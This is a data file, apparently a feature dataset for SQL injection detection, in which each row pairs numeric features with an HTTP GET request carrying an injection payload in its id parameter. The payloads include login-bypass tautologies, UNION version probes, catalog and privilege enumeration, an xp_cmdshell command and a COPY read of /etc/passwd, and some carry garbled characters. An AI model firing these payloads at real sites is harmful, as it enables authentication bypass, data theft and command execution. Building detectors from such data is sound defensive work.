33,1,200,7613,7,10,6,2,1,GET login/?id=' and 1='1 HTTP/1.1
26,1,200,2907,7,7,6,2,1,GET login/?id='-- HTTP/1.1
26,1,200,6541,7,7,6,2,1,GET login/?id='-- HTTP/1.1
26,1,200,1170,7,7,6,2,1,GET login/?id='-- HTTP/1.1
32,1,200,5938,7,5,7,1,1,GET ?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
32,1,200,1012,7,5,7,1,1,GET ?id=1¡¬) and '1¡¬='1¡V HTTP/1.1
80,1,200,7824,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,2175,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7086,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,1142,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,4881,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,2328,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,4339,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7314,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,7319,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
80,1,200,6453,7,52,7,2,1,GET login/?id=select * from syscat.dbauth where grantee = current user; HTTP/1.1
31,1,200,7790,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
31,1,200,6022,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
31,1,200,2165,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
31,1,200,2488,7,10,4,2,0,GET login/?id= and 1=1 HTTP/1.1
27,1,200,7559,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
27,1,200,4117,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
27,1,200,1806,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
27,1,200,7285,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
26,1,200,7515,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
26,1,200,4056,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
26,1,200,1216,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
26,1,200,3458,7,6,5,1,1,GET ?id=' or a=a¡V HTTP/1.1
44,1,200,1999,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7031,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,3448,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,7262,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,6246,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
44,1,200,5806,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
48,1,200,4928,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7685,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4294,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5018,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2385,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3394,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,5843,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,4810,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,3281,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2916,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6011,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,1475,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,2409,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,7420,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
48,1,200,6869,7,26,8,1,1,GET ?id=select current_setting('port'); HTTP/1.1
65,1,200,6075,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,7553,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,5377,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,3375,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,3067,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,6874,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
65,1,200,6189,7,41,8,2,1,GET login/?id=select current_setting('log_connections'); HTTP/1.1
20,2,200,7899,7,2,6,1,1,GET ?id='&' HTTP/1.1
30,1,200,6503,7,4,10,1,1,GET ?id=' or '1'='1'# HTTP/1.1
30,1,200,7886,7,4,10,1,1,GET ?id=' or '1'='1'# HTTP/1.1
30,1,200,7876,7,4,10,1,1,GET ?id=' or '1'='1'# HTTP/1.1
52,1,200,3064,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,6301,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,4532,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,2905,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
44,1,200,2667,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,4308,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,4506,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
44,1,200,2527,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
34,1,200,5942,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
34,1,200,4578,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
58,1,200,5188,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,6970,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,3559,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,1233,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,1037,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,3251,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,3447,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,6560,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,4564,7,33,7,2,2,GET ?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
54,1,200,4759,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,7219,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,3584,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,1093,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,1004,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,3910,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,3720,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4248,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,2827,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,5119,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,6430,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,7022,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,7880,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
54,1,200,4505,7,31,8,2,1,GET login/?id=select current_setting('port'); HTTP/1.1
34,1,200,1218,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4406,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
34,1,200,4674,7,11,8,2,1,GET login/?id=' or 'x'='x HTTP/1.1
61,1,200,1576,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,5489,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,5130,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,2029,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,5234,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,6896,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,5053,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
26,2,200,2678,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,2497,7,7,6,2,1,GET login/?id='&' HTTP/1.1
26,2,200,5556,7,7,6,2,1,GET login/?id='&' HTTP/1.1
31,1,200,3351,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
51,1,200,5574,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2938,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2606,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6180,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
25,1,200,5766,7,4,6,1,2,GET ?id=or 1=1-- HTTP/1.1
27,1,200,5137,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,5539,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,2215,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,6332,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,1755,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,5766,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
38,1,200,7078,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,6050,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,5037,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
38,1,200,7918,7,9,13,1,1,GET ?id='=' 'or' and '=' 'or' HTTP/1.1
67,1,200,5075,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
67,1,200,4164,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
67,1,200,6344,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
57,1,200,1735,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,6326,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,2185,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,3121,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,7086,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,4157,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
25,1,200,3717,7,7,5,2,1,GET ?id=admin'/* HTTP/1.1
25,1,200,3260,7,7,5,2,1,GET ?id=admin'/* HTTP/1.1
25,1,200,7552,7,7,5,2,1,GET ?id=admin'/* HTTP/1.1
25,1,200,1295,7,7,5,2,1,GET ?id=admin'/* HTTP/1.1
75,1,200,1429,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,3811,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
75,1,200,4409,7,50,5,2,1,GET login/?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
59,1,200,7348,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,6953,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,5102,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,5279,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,7145,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,3547,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
39,1,200,4865,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
39,1,200,4747,7,16,8,2,1,GET login/?id=' and 'one'='one HTTP/1.1
49,1,200,5325,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,1972,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,7084,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,5905,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
49,1,200,4072,7,25,6,3,3,GET ?id=copy myfile from '/etc/passwd';  HTTP/1.1
58,1,200,5414,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,6663,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,2468,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,4545,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,4247,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
58,1,200,3170,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
37,1,200,1813,7,9,12,1,1,GET ?id=admin') or ('1'='1'# HTTP/1.1
37,1,200,6611,7,9,12,1,1,GET ?id=admin') or ('1'='1'# HTTP/1.1
30,1,200,6006,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
30,1,200,4428,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
30,1,200,4791,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
50,1,200,6487,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
50,1,200,6801,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
50,1,200,3310,21,9,8,1,1,GET ?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
31,1,200,4223,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
43,1,200,3464,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,2925,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1046,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3733,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1396,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,6152,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3554,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,3593,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
43,1,200,1505,7,23,6,1,1,GET ?id=select current_database(); HTTP/1.1
26,1,200,4465,7,4,5,1,0,GET ?id= or 0=0 # HTTP/1.1
26,1,200,7769,7,4,5,1,0,GET ?id= or 0=0 # HTTP/1.1
25,1,200,7723,7,8,3,1,1,GET ?id= or true HTTP/1.1
25,1,200,2685,7,8,3,1,1,GET ?id= or true HTTP/1.1
69,1,200,5414,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
